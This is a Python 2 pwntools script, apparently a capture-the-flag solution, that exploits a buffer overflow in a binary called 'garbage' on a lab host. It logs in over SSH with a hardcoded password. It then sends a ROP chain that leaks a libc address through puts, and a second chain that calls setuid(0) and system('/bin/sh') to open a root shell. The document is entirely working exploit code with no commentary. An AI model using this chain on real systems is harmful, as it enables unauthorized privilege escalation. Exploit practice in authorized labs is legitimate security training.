#!/usr/bin/env python2

from pwn import *

context(bits = 64, arch = "amd64", endian = "little")

ssh = ssh("margo", "10.10.10.139", password="iamgod$08")
binary = ssh.process("/usr/bin/garbage")

elf = ELF("./garbage")
gadgets = ROP(elf)
libc = ELF("libc-2.27.so")

puts_addr = elf.plt["puts"]
main_addr = elf.symbols["main"]
libc_main_addr = elf.symbols["__libc_start_main"]
pop_rdi = (gadgets.find_gadget(["pop rdi", "ret"]))[0]
ret = (gadgets.find_gadget(["ret"]))[0]

log.info("puts@plt: " + hex(puts_addr))
log.info("__libc_start_main: " + hex(libc_main_addr))
log.info("pop rdi: " + hex(pop_rdi))

offset = "A" * 136

payload = offset
payload += p64(pop_rdi)
payload += p64(libc_main_addr)
payload += p64(puts_addr)
payload += p64(main_addr)

binary.sendline(payload)
binary.recvuntil("access denied.\n")

recieved = binary.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("__libc_start_main: %s" % hex(leak))

libc.address = leak - libc.sym["__libc_start_main"]
log.info("Address of libc %s " % hex(libc.address))

bin_sh = next(libc.search("/bin/sh"))
system = libc.sym["system"]

log.info("/bin/sh at: %s" % hex(bin_sh))
log.info("system function at: %s" % hex(system))

setuid = libc.address + 0xe5970
null = 0x00

rop = offset
rop += p64(pop_rdi)
rop += p64(null)
rop += p64(setuid)
rop += p64(pop_rdi)
rop += p64(bin_sh)
rop += p64(system)

binary.sendline(rop)
binary.recvuntil("access denied.\n")
binary.interactive()
